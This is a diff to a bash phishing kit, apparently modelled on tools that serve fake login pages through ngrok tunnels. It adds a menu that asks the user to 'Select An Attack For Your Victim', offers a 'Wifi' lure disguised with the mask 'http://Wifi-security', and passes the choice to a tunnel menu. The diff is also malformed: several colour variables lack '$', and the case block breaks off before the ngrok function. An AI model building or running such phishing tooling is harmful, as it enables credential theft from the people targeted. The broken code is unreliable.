@@ -214,14 +214,23 @@ tunnel_menu() {
 	esac
 }
 
-# option
-if [[ $option == 1 ]]; then
-server="wifi"
-start
-
-elif [[ $option == 0 ]]; then
-Exit="Exit"
-msg_exit;
+## Menu
+main_menu() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+                
+                {RED}[${WHITE}01${RED}]${ORANGE} Wifi
+                {RED}[${WHITE}02${RED}]${ORANGE} Exit
+        EOF
+	
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+        case $REPLY in 
+		1 | 01)
+			website="Wifi"
+			mask='http://Wifi-security'
+			tunnel_menu;;
+		2 | 02)
 # ngrok 
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
